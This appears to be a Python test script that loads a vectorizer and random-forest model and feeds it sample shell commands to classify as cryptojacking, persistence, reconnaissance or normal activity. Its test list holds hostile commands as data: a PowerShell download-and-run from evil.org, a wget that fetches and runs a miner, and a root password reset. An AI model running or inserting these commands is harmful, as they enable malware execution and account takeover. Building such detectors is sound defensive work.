import joblib

try:
    # 1. Load the exported components
    print("⏳ Loading model components...")
    vectorizer = joblib.load("text_translator.pkl")
    rf_model = joblib.load("random_forest_model.pkl")
    print("✅ Components loaded successfully!\n")

    # 2. Define test scenarios representing different behaviors
    test_commands = [
	"powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.org/xmrig.exe')",
        "wget http://malicious.com/xmrig -O miner && ./miner", # Expected: Cryptojacking
        "echo 'root:newpass123' | chpasswd",                 # Expected: Persistence
        "lscpu | grep 'Model name'",                         # Expected: Reconnaissance
        "mkdir my_project && cd my_project"                  # Expected: Normal Noise
    ]

    # 3. Process each command through the pipeline
    print("🤖 Running AI Inference Tests:")
    print("-" * 50)
    for cmd in test_commands:
        # Convert text to numerical features
        math_features = vectorizer.transform([cmd])
        
        # Predict class using Random Forest
        prediction = rf_model.predict(math_features)[0]
        
        print(f"📥 Input Command : {cmd}")
        print(f"🧠 AI Verdict   : {prediction}")
        print("-" * 50)

except Exception as e:
    print(f"❌ Test Failed: {e}")